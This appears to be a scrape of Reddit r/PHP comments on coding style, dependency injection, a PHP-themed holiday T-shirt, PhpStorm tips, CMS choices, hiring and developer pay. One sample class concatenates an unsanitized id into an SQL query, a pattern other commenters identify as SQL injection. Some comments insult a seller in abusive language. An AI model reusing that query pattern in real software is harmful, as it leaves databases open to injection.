&gt; "old-school", cowboy style, self-taught coder, especially who aren't used to working in teams Don't take that out of context. There's nothing wrong with being self-taught. Tons of PHP devs are self-taught. I'm self-taught too. But there's a LOT wrong with being an old-school, cowboy style, self-taught coder who isn't used to working in a team. And that's what I was saying. Being self-taught has its drawbacks. Many of us (including and especially me) lack the understanding of the principles of software engineering. We don't have a good understanding of OO principles in general, or of design patterns. I'm not speaking of other people, I'm speaking of **me**. I'm shit at this stuff. And in a hire, that's something I'd be looking out for. The last thing I want is to hire someone like me. :)
Yeah, I've recently finished work on a large codebase for a project that was written in a coding style that can probably be best described as "Whatever dumb shit any given person felt like doing on the day". My attempts to introduce PEAR then PSR-2 as it became the dominant standard were met with such fearsome derpery that it was obviously not a battle to be won. I quit instead. (Not over that. The job was just shit, that's just an example of how.) There **are** actually two things in your code that stand out for me as negatives, though. The use of a switch statement to me is a code-smell. It's not necessarily bad. But it suggests there might be a better approach. And the use of global constants would definitely get my attention in a bad way. :)
You have already agreed that writing a CMS is a terrible option. You have already agreed that there are clients that need to be able to maintain their site. Thats what a CMS is for. You are just here to troll CMSs in general and it isn't helpful. Please go find an Xbox One post to claim PS4 is better on or vice versa. That is exactly analogous to what you are doing here on this CMS thread. Edit: Actually, exactly analogous would be going into a console gaming thread and saying PCs are better. Either way you are just trolling and it isn't helpful.
&gt; The use of a switch statement to me is a code-smell. It's not necessarily bad. But it suggests there might be a better approach. Well, it *was* just a boring example w/ no context, but if we're gonna talk particulars, I'll add in this ... I've personally seen some C code compile to smaller assembly when using switch over if/else-ifs, which is important if you're constrained to &lt; 64kb in preboot option ROMs. But again, it was just an example to show formatting of indenting / spacing / etc.
I'm actually surprised I don't see more people who have problems with open ended comments. To me it's as simple as 'If you wouldn't leave a tag open why would you think it's ok to leave a comment tag open'. Maybe that's just a pet peeve since I've seen it introduce easily obfuscated errors into code for reasons as simple as some people's formatting preferences on numerous occasions.
Can you clarify what you mean by "open ended comments"? I'm not sure I get it. 
I don't think it's going to be complete for some time (unfortunately).
This is bald faced ignorance of modern mobile web and nothing more. I know opinions can't be "wrong", but you're skirting the edge. 
I tend to put limited stock on code samples, unless there is something serious (e.g. using unsanitized inputs for databases), in which case I will usually bring it up during the interview and ask them about it. You can have great sample code, but it may or may not actually be indicative of your abilities.
&gt; The argument I've heard is that too many programmers don't really understand string escaping. I think it means most people don't understand it well enough to defend properly against all kinds of injection attacks. I don't, if you ask me. I understand how basic SQL injection works, but that does not mean that I can prevent all forms of it by just being careful. I always assume my knowledge and intelligence are far inferior to any one trying to break into the system. So I don't use procedures that are even remotely exploitable, even at the cost a small performance hit. 
There are plenty of tutorials out there on dependency injections (DI) and inversion of control (IoC) containers. You don't have to pass $db to every function, you could pass it to the constructor when you're instantiating the object or use a setter method to pass it in. Then all the methods in your object will have access to it.
I'm not. It's a compile command. They are compilation options, which will have enabled me to use certain features I needed for a project, at the time. Your comment offends me.
I'll take one. 
There are a couple of simple solutions. You could start it of as $_SESSION['db'] = new mysqli_connect.... That would make it a superglobal, no need for the global call. The best solution would be to use Dependency Injection. This is just a fancy way of saying "I'm going to deliberately give my objects everything they'll need". You don't need to put this in every class and function, just every class/object. class ThisObject { private $database; public function __construct($database){ $this-&gt;database = $database; } public function getStuff($id){ $sql = 'SELECT * FROM stuff WHERE id = '.$id; return $this-&gt;database-&gt;query($sql); } } I should also say that mysqli is not a good approach. Consider PDO as a baseline to doing it right, with an ORM as the optimal. Then you can do rad things like return $this-&gt;stuff-&gt;find($id); Much more readable. edit: Why the downvotes, did I do something dumb? Edit again: I as merely trying to indicate the syntax of an ORM, not best practise. Have replaced example with a more comparable DI usage. 
I'd like one. i love the idea.
Not to be the nitpicker, but the curly quotation marks are in the opposite places. They probably should just be straight double quote marks anyway.
If this gets fixed I'll take one
Love it, I would purchase one, if it could be sent out rather quickly (like before xmas). edit: and the quotes are fixed :P
I'll take one as well if the price is right 
Make is PSR-2 and I'm in.
You may want to look into Chef, supposedly it is more amenable to building from source. I've also had this need, especially when attempting to run newer versions of PHP when the latest official package is 2-3 years old (CentOS AND RHEL I'm looking at you). And no the remi repo is not a viable option for enterprise deployments. Currently we just use zend server and let them deal with it.
I would take one off your hands.
PHP learner here. Can you explain why that SQL statement is bad? 
I like this one the best because it doesn't leave a trailing space at the end.
Serious response: Can we stop using echo like its a function? You know, on the basis that it **isn't** a function? I know it's just a shirt, but... Joke response 1: Whoah, this is way overengineered. You could get exact same result by just going echo 'Ho! Ho! Ho!'; Come on, guys. We're supposed to be professionals. Joke response 2: Whoah, this is way underengineered. It should create an instance of the Ho object which extends the SeasonsGreetings class, returning the number of Hos entered as the Ho constructor. This is json_encoded and returned for use in a web API. I've put the code for this up on Packagist. You're welcome. Come on, guys, we're supposed to be professionals. 
Yeah, but they posted it better. 
You haven't sanitized your user inputs. Anyone could freely execute a database query using that get variable and a little SQL knowledge. Look up SQL Injection.
Veins on that guy are going to explode.
As awesome as this is, just doesn't fit well on a shirt.
Yeah… So the final issue was that my web host installed an Apache module ModPagespeed, and the solution is to add "ModPagespeed off" to the .htaccess file. It was unrelated to PHP, just timed so they installed the module as I started learning PHP.
If you want to as simple as possible in a php file it would be just Ho! Ho! Ho! And done. Same exact results.
&gt; Serious response: Can we stop using echo like its a function? You know, on the basis that it isn't a function? Sure. As soon as all language constructs are consistent in this syntactic usage. Ever try to use [unset()](http://www.php.net/unset) without parens? Until then, there are enough other inconsistencies in PHP to remember that I'm going to stick with invoking syntactically function-like things as functions. [edit: typo]
I wouldn't advise getting too hung up on a global $db. Not only is this php, where the process dies after each request, you said yourself this is a small project with a single developer. It seems not only appropriate but idiomatic - don't add unnecessary complexity just for the sake of it. I mean no disrespect to the other posters but until you are reusing objects in different contexts (unit testing being the classic example) you won't see the benefits of dependency injection. When you need it you will know. Or you could (maybe) instantiate your $db from a Singleton's constructor and call that everywhere. Now you still have a global but it's in a different namespace and you're immune to criticism because you're following a Design Pattern ... :P 
 implode( ' ', array_fill( 0, 3, 'Ho!' ) );
I was about to correct you to 0, 2 and then I realized it was just the count. Haha. 
It's easy to criticise EAV, but can you come up with a better system that allows clients to dynamically add attributes to other entities?
I assume you're referring to the layout xml system. As I said, Magento is full of bloat, and it could certainly be better documented, but that doesn't mean it's bad. Just complicated and more difficult to learn.
That's okay. You learned something :)
Fixed: http://programmingtees.storenvy.com/products
Fixed: http://programmingtees.storenvy.com/products 
Fixed: http://programmingtees.storenvy.com/products
Better? http://programmingtees.storenvy.com/products
Awesome, here's the link: http://programmingtees.storenvy.com/products
Just got this set up: http://programmingtees.storenvy.com/products
Just got this set up: http://programmingtees.storenvy.com/products
I really should have made this a text post so I could edit it... Just got this set up: http://programmingtees.storenvy.com/products
Is $20 good with $4.50 shipping? Just got this set up: http://programmingtees.storenvy.com/products
Just got this set up: http://programmingtees.storenvy.com/products
He did not make it, it's just from PHP.net. And I wouldn't see why this would be a problem.
That's not a nitpick. It's just plain wrong on a high OCD scale. We know what it is trying to say, but damn, can't switch that debug brain off.
You going to deal with that final trailing space, or what? ;-) Maybe fill an array with three ho elements then implode it? Do we need to set up a git project for this shirt, so we can issue festive pull requests? Edit: just noticed the implode version already posted. 
tbh jumping from Joomla to Wordpress is like jumping out of hell only to drop in a deep deep pile of shit.
All fun and games until ++$i forgets 3 that one time and goes on forever. 
I really like them! But you don't code like me so I wouldn't feel comfortable wearing it...
If you fix it so it's better syntax, I'll take one for($i=0;$i&lt;3;$i++) { echo 'Ho! '; } There's really no reason surround 'Ho! ' in parenthesis as well as, even if you wanted to display it that way, for the space between `echo` and `(` and no space between `)` and `{`...
This made my day.
Is there going to be a matching mug? [This one](http://i.imgur.com/lIuRuT9) is sat on my desk right now.
Good luck pandering to every programmer and style haha.
Just found the answer: print behave like echo. so &gt; print("Three") &amp;&amp; print("Two") is interpreted by PHP as &gt; print ("Three" &amp;&amp; print("Two")) and both of these expressions always return 1 (which is the return of print).
 echo str_repeat ( 'Ho! ', 3 ); trim it if you're OCD
I think one part of it is to have "&lt;3" as part of the code since it's have it's own internet meaning. Correct me on this one?
You're a few days late but thanks anyway!
What's this in there for then? https://github.com/joomla/joomla-cms/blob/master/libraries/joomla/user/helper.php#L298
I agree for the most part but it's so much easier to keep updated time wise.
I have no idea why this post is being downvoted, but I think it speaks poorly of the community. I think you're 100% right. Not necessarily in the implementation (I wouldn't know) but in the principle. Yes. A modern single-page web app is really a JavaScript app using PHP to generate an initial view and then letting all further requests and routing be handled by JavaScript. Ideally by a framework like Angular or Ember. PHP at that point becomes a backed API. This may be the reason for the resistance. PHP devs like me may be hesitant to hand over control from PHP to the JS layer. After all, we've spent so long learning Laravel's routes and template engine. It would be a shame to just... Let's be honest, JS frameworks are a cunt to learn. A friend of mine is currently learning Ember and constantly complains about the shitty, incomplete docs and dickish community. And yet it seems to me that this is the inescapable path of web app development. PHP programmers will need to learn a JS framework to be able to deliver a quality product. That's why my next project will be pure Ember - not just more auto generated Laravel. 
Dude, just so you know. I'm gonna follow you around to every subreddit you go and point out how this is shit. Do not post this stuff in webdev,php, or anywhere I can see it. You're a spammer. You're trash. Get the fuck off.
This is trash, made by a spammer. Please do not buy .
 ?&gt; Ho! Ho! Ho!&lt;?php
You know how we know you're full of shit? You make really bad errors in your code even on a fucking tshirt. 
Take a guess. If you don't think backwards compatibility is important, then I really don't have anything more to say to you. Joomla is used on every kind of host you can imagine, and there are lots of shitty hosts out there. People on the shittiest of web hosts still need to use md5. Anthony Ferrara (author of PHP-CryptLib) used to be a Joomla developer way back when. He's been helping with the bcrypt implementation https://github.com/ircmaxell 
I will start. This is assuming the default keymap (i.e. neither you or a plugin you installed changed the default shortcuts) **Bundled Features** ---- =========== Navigation =========== **Ctrl + Shift + A**: Let's you navigate to anything inside PhpStorm. Don't remember where an option or a feature was? Just start typing and press enter. It will also tell you where the feature is, in case you want to use the menus the next time **Ctrl + Click OR Middle Click on a symbol** (variable, function or method, class) will take you to the definition. **Ctrl + N**: Go to a class **Ctrl + Shift + N**: Go to a file **Ctrl + Alt + Shift + N**: Go to a symbol NOTE FOR THE LAST THREE: A very nice feature is that if, for example, you have a class named *RedditCrawler*, you can navigate to it by typing *RC*, *RedCraw*, *RCraw*, or whatever combination. You can also specify a line. *RC:32* would take you to the file that defines *RedditCrawler* and place the cursor in the line 32 **Alt + Home** Lets you move through the Breadcrumb Navigation. Escape to return to the code =========== Information =========== **Ctrl + Q while the cursor is on a symbol** will show you a popup with documentation. This includes built in PHP features and custom definitions **Ctrl + Shift + I while the cursor is on a symbol** will show a popup with the definition of that symbol. =========== Code =========== **Ctrl + Alt + Shift + T** Opens the "Refactor This" popup. Very handy. The popup changes depending on where you're standing. **Alt + Insert** Opens the "Generate" popup. This also changes depending on where you're standing =========== Menus ============ **Alt + Insert** It's the same as going to "File -&gt; New...." **Plugins** ----- **IdeaVim**: lets you use the best of the best IDE with the fantastic keymap of Vim. You (de)activate it by pressing *Alt + Shift + V*. Keep in mind that if you defined custom keyboard shortcuts in the settings, they will probably change while the Vim keymap is active **AltN8**: Press ALT+ 8 while on a file to navigate to related files. Very useful for going back and forth between classes and their respective tests **Ace Jump**: Probably my favorite. Let's you navigate in the currently visible piece of code. You press *Ctrl+;* then press a character and all occurrences of that character currently on the screen will be labeled. You type the label and the plugin takes you to that spot. **BrowseWordAtCaret**: Lets you navigate up and down between occurrences of the word you are currently positioned in **CSS-X-Fire**: You can edit your site CSS in the ~~Chrome console (not sure if in Firefox too)~~ Firebug Console and when you go back to PhpStorm this handy plugin will ask you if you would like to change your code to match the modifications you did in the browser. Yes, it's that good **Github and Bitbucket integration**: Two separate plugins. Self explanatory **Scratch**: Lets you use temporary files inside PHPStorm. Great for brainstorming or organizing related ideas without worrying where to place them within the project **Key Promoter**: Simple yet useful. Tells you what keystrokes you could have used to go wherever you went using the menus **Extra Tips** ---- * PhpStorm can generate UML diagrams from a project or classes. On the Project navigator, right click a php file or a folder, and look for the *Diagrams* menu in the popup * You can define certain coding styles on a per-project basis and for different languages. For PHP, you can select coding styles from a predefined set. *File -&gt; Settings -&gt; Code Style -&gt; PHP -&gt; Set From...*. Later, to enforce the style on an existing codebase, go to *Code -&gt; Reformat Code* and PhpStorm will do the trick
acejump is great. I also use the symfony 2 plugin. * ctrl+p will tell you the params inside a method call * ctrl+n to jump to any class - just start typing * alt+g to jump to a line number 
In PHP, I've read there's a negligible performance improvement from using single quotes. This is because single quotes are interpreted slightly different than double quotes. You can put $variable inside double quotes and the output will be $variable's value, whereas in single quotes it's a literal representation. Additionally, \n or other backslash-escaped characters are interpreted in doubles but not in singles. Double quotes are perfectly acceptable here, but no programmer I've ever seen uses *curly* double quotes in code.
Colleague swears by [IdeaVim](http://plugins.jetbrains.com/plugin/164) - Vim key mappings for Jetbrains products And for all ya'll magento developers there is [Magicento](http://magicento.com/) 
From a closed context theoretical PHP programming sense when discussing a limited scope application, yes, I think you are correct. However, from a practical standpoint, considering that; a) web-apps don't typically live in vacuums, but rather typically reside within a web site that does have static text for which creating MVCish templates might be overkill, and b) from an SEO standpoint that web-crawlers won't typically execute your javascript code to index your dynamic content, your premise is a bit too totalitarian/overreaching.
css-x-fire connected to Firebug is wonderful for doing CSS changes
learned a good few from this - cheers. Also, stuff like typing pubf then hitting tab will auto created a public function method, which you can tab through and fill in the bits to complete the template. Others are prif, fore... and there's others I forget. 
Sorry about the constant link. Should have pmed everyone who said they were interested I guess.
I went more for readability for the shirt. I know you're a legendary lurker or something, but my years of paychecks would say otherwise that I am in fact a programmer.
Yes, I'm a mechanic. Because one time I changed my own oil.
This is Joomla framework 1.0, it doesn't get more major than that. If there's an issue with using it in Joomla CMS than the minor releases of the CMS shouldn't use the framework. 
downvotes for optimizing? reddit php community makes me sad :(
Vagrant / Terminal support built right in is awesome. No need for any other windows open.
I map the "Select In" menu to cmd + shift + 1. This allows me to hit cmd + shift + 1 while in a file, then hit enter. I am then taken to this file in the Project View. It's very nice if you want to go to another file in the same (or near) directory, but don't know the name.
Not if it's the only thing in the file... 
The HTML Generation is pretty awesome in my opinion. !&lt;tab&gt; //generates &lt;!doctype html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8" /&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;/html&gt; You can also use variables in it like so: h$[title=item$]{Header $}*3&lt;tab&gt; //generates &lt;h1 title="item1"&gt;Header 1&lt;/h1&gt; &lt;h2 title="item2"&gt;Header 2&lt;/h2&gt; &lt;h3 title="item3"&gt;Header 3&lt;/h3&gt; The full cheat sheet is [here.](http://docs.emmet.io/cheat-sheet/) You can also add your own. Since I work with zurb foundation a lot, I can do *fr3&lt;tab&gt;* which will generate html for a a responsive grid row with three equally sized columns. PS: Dont forget to give some love to /r/phpstorm/
On the "Project" sidebar, press the tiny settings icon on the top right of it, then uncheck "Pinned Mode". Now when you are coding you get the full width of the screen (very important with my vertically positioned monitor). Any time you want to view the project files again hit "Alt + 1"
 &lt;?php /********************** Ho Ho Ho script ©2013 by MrDubious Licensed under a creative commons Redistribution allowed with attribution intact ********************************/ ?&gt;Ho! Ho! Ho!&lt;?php /******************************** I'm serious about the attribution part. I will raise an internet shitstorm if I see my script without this part in it ***********************************/ ?&gt; 
Very nice. 
CSS-X-Fire is indeed freaking awesome, and works exactly as advertised.
Sold out of M and L already?
This is a nice one!
Updated, set up a cart really quick after the response last night. Thought the quantity was unlimited.
&gt; The professor isn't very familiar with PHP and didn't think it could be done, not sure why. Your prof is either a raging idiot, or has little faith in you, or both. As for your code, I don't want to say it's bad (I'm going to assume that it works per your assignment), but there's a lot to be desired. I'm going to point out a few things, but don't get discouraged; you _did_ post this to /r/php and ask for feedback ;) * Learn the [phpDocumentor](http://www.phpdoc.org/) style of docblock comments, and don't use anything but `/` and `*` to create comments. All those other chars you used are really distracting, non-standard, and really server no purpose. E.g. instead of this: //+-------------------------------------------+ //| Finite State Machine Library in PHP //| ======================================== //| Author: John Cuppi //| Modified: 11:21 PM Thursday, December 05, 2013 //| ======================================== //+-------------------------------------------+ Do this: /** * Finite State Machine Library in PHP * * @author John Cuppi * @version 11:21 PM Thursday, December 05, 2013 */ * I can't tell if it's just github or not, but your whitespace formatting looks kind of crazy. For instance this: function __construct() { // Set the beginning state $this-&gt;set_state(0); Should be: function __construct() { // Set the beginning state $this-&gt;set_state(0); * It's kind of pointless to initialize static values inside your ctor, e.g. on lines 38 and 56 -- I much prefer to initialize those in the class definition. * Your method `filter_bin_string()` will fail if the `bin_str` is large enough. Since you're not actually doing any mathematical operations on `bin_str`, there's no need really to convert it to an int, because anything larger than `PHP_INT_MAX` (2147483647 on my box) will be set to `PHP_INT_MAX`. Example: using `11111111111` as your input. * Your class properties probably shouldn't be `public`. 
So I used Magicento when it was first released, and ended up disabling it due to some bug/conflict. I was never really that impressed, nor did I miss it once I disabled it. I see it popping up routinely in /r/php and /r/magento, but I haven't shelled out the cash to try it since it stopped being free. What makes Magicento so great?
Its been a while since I used Drupal, but here's how they compare off the top of my head. Concrete5 page types and page attributes should be a good analog to the CCK / Fields modules. Each "page" is a collection of attributes. You can create different page types, assign various attributes to each page type, and then customize the controller and view for each specific page type. You can also query these collections based on the custom attributes. If you wanted to create a content type of "Car" for an automotive website, you could create a Car page type, assign attributes for year, body style, color, engine type, etc, then set up specific views, collections lists, search queries and other extensions specific to that content / page type. Views are sort of like blocks, in that you can add a wide variety of blocks to any given content area on any given page, and adjust the parameters of each block individually. Suppose you want to list articles of a certain type, in a certain order, in a certain category, with a specific output template, etc. You can either use the existing blocks, or create your own with an unlimited number of filters and parameters. I can't think of a Workbench analog off the top of my head, although you could easily find something similar in the marketplace that shows all of the pages and content that the user owns, has edited, or has privileges to access and edit. Concrete5 has both a front-end editor and back end dashboard, and you can set the dashboard permissions to only show specific functions to the user based on their group membership, but I can't quite come up with something that puts it all together like Workbench. Node relationships - I can't think of an analog here. I would guess that somewhere out in the marketplace is a custom attribute type with the ability to look up to and identify other content types or attributes across the site, but I can't think of one off the top of my head. As far as I know, the attributes are fixed based on pre-entered values, so if you're doing a lot of relationship building in Drupal, then this might be a sticking point. 
This doesn't address your post; I'm just adding here because it's related to PHP Storm. This software hurts my productivity one small way. I can't seem to ever turn off auto-complete features entirely. I don't want my IDE to enter anything that I don't type or select from a drop-down during the autopopup code completion. Depending upon the type of file I'm working in, it likes to close HTML tags, add quotes and parenthesis, etc. I have all of the relevant options turned off in Editor / Smart Keys settings. Is there another place where this functionality is managed?
Thanks. Placed my order. 
Hey, thanks for the feedback. That was really constructive and thorough and that was the point of this post; to get feedback like yours. Indeed, the code does work as per the assignment I was just looking at ways it could be improved further. Github did seem to screw up some of the formatting when I uploaded it, I'm not sure why. I will make some changes. Thanks.
My favourite features of it: * Module Creator * Model Triad (Model, Resource + Collection) * Autocomplete: XML, Mage::getModel(autocomplete), classes etc. * Ctrl + Click Goto feature, makes moving around the stack much less painful, eg looking for a Block method in a template (works even if has been rewritten). * Rewrite conflict warnings. Generally it just a lot of small things which makes Magento development more pleasant, he keeps updating it with even more cool stuff as well. As for stability it is MUCH more stable, you could always ask the guy if you want to try it for free, seems fairly reasonable got my colleague one free. http://magicento.com/#features
For anyone who doesn't know, that markup generation syntax is [Emmet](http://emmet.io/) at work. Not peculiar to PHPStorm but still a nice thing to have. If there was a way to have it autocomplete classes when doing a `ul.className` I'd love it all the more.
Anybody know how I go to a method in the open class? I want to be able to type in a method name in a class and go to that method.
Re: the formatting... did you use tabs? I think Github expects/works best with spaces instead of tabs. Kind of annoying, but if you change your editor to use spaces instead then everything should look the same on GH as it does in your editor.
http://www.reactiongifs.us/wp-content/uploads/2013/07/blow_it_up_ugly_americans.gif
I asked the mods for some CSS changes more than 2 months ago. /u/frozenfire asked me to make a `merge request` at github, [which I did](https://github.com/TheFrozenFire/r-php-stylesheet/pull/1) two months ago. I've had no answer from him since :(
Is there a list of class methods like NetBeans has, or a way to jump to a specific method in a class?
Try going to *File &gt; Power Save Mode*. This will stop all autocompletion + code analysis. Not sure how you can configure it to do code analysis, but stop auto completion.
Is there any way to get it to work with LESS/SASS, or is that too much to ask?
Nah, it's cool, I ran this code. $_GET = array_map('mysql_real_escape_string', $_GET); *cough*
Ah yes. Thanks. 
I did indeed use tabs. That would explain a lot. Thanks.
http://i.imgur.com/pbgUpGU.png
Damn i love these kinds of things. So... backwards and confusing that it's almost elegant.
You can now do all of this right in Chrome with no other tools necessary. Search for "Chrome workspaces" and you'll find the details.
There's a Source view, I believe the hotkey is command-7.
Any constructive reasons for the dislike ?
Ctrl+mouseover a: 1. Function/method, to display a brief definition with return type. 2. Variable, to display its type (if it knows it). 3. Constant, to display its value.
The Router has to much responsibility.
This isn't really a deal-breaker for me, honestly. I can teach you to sanitize inputs. The real thing I'm looking for here is that if I explain to you why that's bad, that you immediately grasp the implications of doing it that way and understand why that's a Very Bad Thing(tm). Edit: (For an entry-level/junior position. It's a deal-breaker for anything higher than that.)
For entry level coders, there are a lot of things that people look for that I can easily teach you, such as basic OOP, basic security, basic input sanitization, and so on. I don't particularly care about those things in that case. For an entry-level or junior position, I look for the following: * Readable Code * Actually solving the problem it sets out to solve * Self-documenting code * As little extraneous stuff as possible Senior coders don't often ask questions like this and often have very solid code samples to look at, anyway. For senior devs, in addition to the above I look for: * Well-structured, organized code (whether OOP or not) * Use of some sort of framework (not picky, can be custom) * Novel ways of solving a problem - Most things can be brute-forced, but sometimes it's better to solve things in a novel way, whether that's recursion or abstraction or whatever. At an actual interview, I would try to refer to the code samples for many of the technical questions: * Why did you do X this way? Why not another way? * Given an additional requirement Y, how would you adjust the code? * This is O( n^2 ) complexity. Can you do better? And so on. The most important thing is just problem solving skills. I want to know that given a problem, I can trust you to solve it. Everything else is negotiable.
I thought it was pretty cool. Not like your shirt needs to be PCI compliant or anything. lol
https://github.com/lastguest/mu &lt;- PHP framework that fits in a tweet. No, not mine.
Alt up and Alt down (Control up and Control down in OSX) allow you to go to the previous and next methods, respectively. It's not the same, but it's a start.
Holy crap, those are [the docs](http://docs.emmet.io/) I've been looking for, I had no idea about Emmet, and thus had no idea what to even search for. So big thanks, I've been trying to find more info on how to use this feature, to no avail. Rock. Edt: god. damn. I can spend hours in there. Itis exactly what I was looking for, the whole language behind this code generation feature... I *knew* it was there, just didn't know what to look for. 
Very, very insecure.
This might be the wrong place for this, but what is with the obsession all of the sudden with getting the smallest or shortest webpage/framework/animation?
How is this remotely relevant to /r/PHP 
[Hey man, I found a cool Gist and forked it!](https://gist.github.com/BrynM/7918253)
I've got it working perfectly with LESS. Not sure about SASS. There's a Plugin you can install (Can't remember the name, but it's something obvious like "LESS Compiler", which allows LESS files to be auto-compiled (you specify a source directory, and file pattern, and a target directory). So I'm purely coding in LESS, but the web is purely seeing pure CSS, so no need to 
Command+f12?
I know PHP devs that make $400 an hour. Its all about skill over what language you use.
I'm not going to be much help, but I'm guessing the wage drops are due to increasing supply of php devs. Freelancing is much different than being employed, perhaps 10-30% of your overall "working" hours will not be billable hours, and that's if you're good at managing your time. Of course your mileage may vary. Start ups are a bit more foreign to me. 
This is not a framework, just a router.
Don't pigeon hole yourself as a PHP developer. Learn or at least be open to learning other languages. Also, get some skills up and down the stack so that you're a generalist (HTML, CSS, JS, servers, databases). If you do that and you can get stuff done, you'll be able to make decent cash.
Obviously not the point of this 'mental exercise'. 
Duh
Here in the states it can range somewhat. In the fly-over states senior level positions typically seem to max out at around $90k USD. Exceptions are Denver area which I often come across ads topping out at around 110k. In NYC I know a few folks making ~150k, but their cost of living is through the roof. Same goes for San Francisco. 150K in USD is £91530
"Twitto" by @fabpot: require __DIR__.'/c.php';if (!is_callable($c = @$_GET['c'] ?: function() { echo 'Woah!'; })) throw new Exception('Error');$c(); More info here: http://twitto.org/ 
I think they call it "Structure", but your command-7 shortcut is right.
First " the odds of it getting overwritten seem low (especially considering I am and will probably always be the only person working on the project)." True, but when it does get overwritter or destroyed, it'll be a pain to debug. You should either wrap it in a singleton (which should at least make it harder to overwrite or accidentally destory it). Next level solution is to have classes that Extend a base class which holds $db instance and uses that instance variable to do queries. Level 3 would be to have classes that take $db in their constructor (this is the injection of dependencies bit) instead of extending a class.
Once you start taking away enough features, everything starts to look like a router. ;-)
It's completely up to the organizer. I'm the organizer of the Buffalo, NY PHP user group. Depending on how many attendees we have the schedule as follows: Second Tuesday of every month: * 6:30 Beginner topic * 7:00 Introductions/PHP News/Networking/Food * 7:30 Advanced Topic * 8:15 Freeform (People needing help with their website, something cool someone found, just talking shop, etc.) This format allows newbies to show up get some content, network, and eat but not have to sit through the advanced stuff then the more advanced folk can show up at 7 and still eat, network, etc but not have to sit through boring stuff like "What's a class?" As far as formality it's super informal. The presenter is free to say "Please hold your questions til the end" but usually there's quite a bit of back and forth. Showing off new projects is left for the freeform section The exact times aren't hard, we don't cut presenters off at 7 if they have more/less content but in general that's the order they go in. I'd say once every 3-4 months we do a joint meetup with the Buffalo Ruby group, this is always a great time
I'm not sure you've understood the question. I'm sure you can use LESS and PHPStorm, but is it compatible with the CSS-X-Fire plugin? Can you edit the LESS files from within Firebug?
Use a static class. &lt;?php class App { public static $Config = array( /* config goes here */ ); } function doStuff(){ if(App::$Config['something'] == 'that'){ // Do more stuff } } ?&gt; -- edit -- I forgot to mention, the class can also be an abstract class: &lt;?php abstract class App { public static $Config = array( /* config goes here */ ); } ?&gt; The benefit of this is that the class then can't be instantiated: &lt;?php new App; ?&gt;
Thanks for the insight. As this is a very first for me, and Albania having no established PHP scene, any glimpse of what happens in the more developed areas is a great help.
In the 7.1 EAP/beta, there's a new "search everywhere" feature that you can access by pressing shift twice. It's a combination of recent files, go to file, go to symbol and quick access to all actions &amp; settings. Even though it's only been released for a few weeks, this has quickly become one of my most-used keys.
same in the opposite, you add features and it looks more like a router (look at klein)
It's not exactly a great practice to be throwing data around like that. Preferably the database access should be limited to a small number of classes with the sole responsibility of dealing with the database. Using a global function is bad practice, using a global object is too, and adding a parameter to tonnes of different places to pass and expose a huge piece of functionality is really breaking encapsulation principles. A few suggestions; * use a DAO (not my preferred way) * have all database accessing occur in a small number of early allocated classes that each own a reference to the sql object or the DAO * dont use globals * don't use general terms like config for your database config * learn about principles such as the single responsibility principle, encapsulation and other useful things within software engineering * avoid the PHP way, some of the best written code I've seen and written in PHP could pass off as somewhere between C++ and Java, what you're doing looks like classic PHP from a tutorial.
Would that class file be in it's own file, and "used" by the file that holds the main functions, or would that "class" go right at the top of the main functions file?
Either or. I'd recommend putting it into its own file and putting a require_once at the top of any PHP file that'll make use of that configuration. // AppConfig.php &lt;?php class App { public static $Config = array( /* config goes here */ ); } ?&gt; // Main.php &lt;?php require_once('AppConfig.php'); /* Lots of logic here or whatever. */ function doStuff(){ if(App::$Config['something'] == 'that'){ // Do more stuff } } ?&gt;
My recommendation would be to download the codeigniter source and have a look at how they handle class loading/database access/session management. Basically, there is a whole lot that you can learn just by reading the implementation details of popular frameworks.
- Ctrl-f12 and start typing your method name. - Put cursor on a variable or method and press shift-f6. It will rename the variable and all occurrences - Select a long statement and press Ctrl-Shift v (or a combination with alt, I always forget) and you can replace it with a variable. - Ctrl-t update from svn/git - Ctrl-k is commit - Ctrl shift f12 is full screen - Ctrl-w is context select. This is the most awesome keymap in phpstorm - Ctrl-w inside method parameter to get info about type of parameter 
Meetup.com is a kind of necessary evil. It's not free and it's not that good, unfortunately lots and lots of people use it. It's the main way people find our events. So that might be a better place to start rather than building your own website.
I got some use from even the free older version(1.something) but, the one thing that stopped me from continuing to use it or pay for the newer version is just how infuriating that version was. Caused tons of slowness, constant alerts to update, and just wasn't worth it to me for the bit of value it was adding. The ability to navigate the magento files like normal php dependencies was really really helpful though, if it's significantly improved maybe it's worth checking out but, in general I find really poor quality free trials with expensive pay-walled versions seems to be par for the course in Magento. At least in the case of Magecinto there's support provided.
Sorry, this isn't the right forum for your issue.
Anything you do despite the lack of knowledge why is [cargo cult](http://en.wikipedia.org/wiki/Cargo_cult_programming). Your method of dev ops offends [your successor](http://c2.com/cgi/wiki?CodeForTheMaintainer).
21 yes, and 0 no. That's practically unheard of.
Except it's not my method of development. It is not code. It is a set of compilation options for the compilation of PHP. Do you honestly not understand the difference? EDIT: For all of you downvoting this, get it in to your thick skulls that there is a difference between coding style and setting compile flags. These two things have nothing to do with each other and they do not indicate anything about each other, so stop acting like they do. It just makes you look insecure and hungry for attention.
&gt;**Alt + Home** Lets you move through the **Breadcum** Navigation. I'm not really sure I'll use this one.
The really crazy thing is how fast they got this up an running.
Can you elaborate more on what dependency injection is? 
The DI route doesn't preclude using a singleton (note the lowercase S).
A static class is a horrible idea from a testability perspective.
[here you go](http://lmgtfy.com/?q=PDO+tutorial)
I could always search everywhere by cntrl-alt-s (windows) cntrl-command-s (mac) iirc
Hey; always up for learning. I fail to see why that statement is true. Can you elaborate, please?
Before my job, I never touched PHP, now that's the only language I use aside from scala, and here starting salary is above 110k. I think all that matters is where you look. There really isn't a "ceiling"
Hey! Was that supposed to be snide? :P - maintainer of Klein
And herein lies the problem. I could get 4 $25 per hour guys to replace one of your developers and heck, I can replace one of them with 3 $8 per hour odesk/elance guys. So now my team is 1 $100 per hour, 8 $25 per hour and 12 $8 per hour guys all for the cost of the $400 guy. This enables me to develop a badly designed non-scalable disaster of a system much more quickly. In fact I might just call it Obamacare (not saying this is what happened, but ....). Justifying 1 guy at $xx rate is fun stuff. Once in a while the $400 guy would be rubbish and the $8 guy a future star, then what!! Of course the law of averages is the reverse. 
This is very clean and concise. Great job, op! I had some issues today with 'composer update'. It was taking way to long to update the dependencies. I figured out that the 512MB of memory on my cloud server was not enough. Bumped memory up to a gig and blam! No issues. Seems it uses around 615 MB. For what it's worth.
